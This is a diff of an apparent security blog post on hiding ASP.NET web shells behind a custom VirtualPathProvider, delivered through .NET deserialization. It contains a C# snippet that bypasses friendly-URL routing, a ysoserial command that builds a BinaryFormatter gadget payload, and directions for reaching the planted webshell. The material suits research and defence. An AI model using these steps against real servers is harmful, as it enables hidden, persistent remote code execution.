@@ -145,11 +145,11 @@ with Exists function always return True, we can access arbitrary filename to get
 
 ![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/6d31d5c4-facc-47f3-a17f-9f2428bec51d)
 
-For custom VirtualPathProvider, some methods have to be override to serve our shell content, one of them is GetFile
+We would use custom VirtualPathProvider to register our virtual path handler. When ASP.NET gets a request to supply a file that is based on a virtual path, it looks in the registered chain of providers and feeds the virtual path to the first provider in the chain. The provider interprets the path to determine if it is a file that belongs in the providers underlying file system. If so, it serves the file back to ASP.NET, or otherwise calls the next provider to serve the file. For custom VirtualPathProvider, some methods have to be override to serve our shell content, one of them is GetFile
 
 ![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/97d710a6-2f52-45bb-9b08-0662bbd1ed7f)
 
-Since .NET 4.5, web applications can use friendly URLs to not use ".aspx" in the URL when pointing at the ASPX pages. This can stop our method of creating ghost web shells. The following solution was found to overwrite this setting for web applications which used this feature.
+Another restriction here that since .NET 4.5, web applications can use friendly URLs to not use ".aspx" in the URL when pointing at the ASPX pages. This can stop our method of creating ghost web shells. The following solution was found to overwrite this setting for web applications which used this feature.
 
 ```csharp
 foreach(var route in System.Web.Routing.RouteTable.Routes)
@@ -171,7 +171,7 @@ This code has already been included in the GhostWebShell.cs file which needs to 
 ysoserial.exe -f BinaryFormatter -g ActivitySurrogateSelectorFromFile -c "ExploitClass.cs;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.dll;C:\Windows\Microsoft.NET\Framework64\v4.0.30319\System.Web.dll;D:\code\deser\packages\Microsoft.AspNet.FriendlyUrls.Core.1.0.2\lib\net45\Microsoft.AspNet.FriendlyUrls.dll"
 ```
 
-Then reproduce previous steps to exploit. Then you can access webshell on /fakepath/[anyshellname].aspx
+Remember to change your Microsoft.AspNet.FriendlyUrls.dll location. Then reproduce previous steps to exploit. Access webshell on /fakepath/[anyshellname].aspx
 
 ![image](https://github.com/hnd3884/hnd3884.github.io/assets/61985236/d7230584-8e3b-4262-b9d4-ffd0a3bbb7bf)
 
